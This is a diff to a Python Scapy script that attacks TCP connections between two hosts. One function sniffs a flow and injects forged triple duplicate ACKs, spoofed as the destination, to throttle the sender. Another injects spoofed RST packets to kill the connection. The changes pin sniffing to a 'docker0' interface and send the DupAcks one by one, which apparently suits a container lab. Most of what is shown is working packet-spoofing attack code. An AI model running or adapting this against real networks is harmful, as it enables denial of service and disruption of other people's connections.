@@ -1,6 +1,9 @@
 import sys
 from scapy.all import sniff, IP, TCP, send, sendp, Ether
 
+INTERFACE = "docker0" 
+# 
+
 def throttle_transmission(source_ip, dest_ip, verbose=True):
     throttle_rate = int(input("Input throttle rate (how many packets between each DupAck) [2]: ")) or 2
     pkt_count = [0]
@@ -22,13 +25,15 @@ def throttle_transmission(source_ip, dest_ip, verbose=True):
                 eth = Ether(dst=pkt[Ether].src) 
 
                 dup_ack = eth / IP(src=dest_ip, dst=source_ip) / TCP(sport=src_port, dport=dest_port, flags='A', seq=seq_num, ack=target_ack)
-                sendp([dup_ack]*3, verbose=False)
+                for _ in range(3):
+                    sendp([dup_ack], verbose=False)
                 if verbose: print("Sent 3 DupAck")
+
             else:
                 if verbose: print(f"Allowing packet {pkt_count} through")
 
     # We need to send the ACKs from the DEST to the SRC
-    sniff(filter=f"tcp and src host {dest_ip} and dst host {source_ip}", prn=prn_throttle)
+    sniff(iface=INTERFACE, filter=f"tcp and src host {dest_ip} and dst host {source_ip}", prn=prn_throttle)
 
 
 def kill_transmission(source_ip, dest_ip):
@@ -52,7 +57,7 @@ def kill_transmission(source_ip, dest_ip):
             sendp([rst_to_src, rst_to_dst], verbose=False)
             print(f"Sent RST pair to source and destination")
 
-    sniff(filter=f"tcp and src host {source_ip} and dst host {dest_ip}", prn=prn_kill, count=10)
+    sniff(iface=INTERFACE, filter=f"tcp and src host {source_ip} and dst host {dest_ip}", prn=prn_kill, count=10)
 
 
 if __name__ == "__main__":
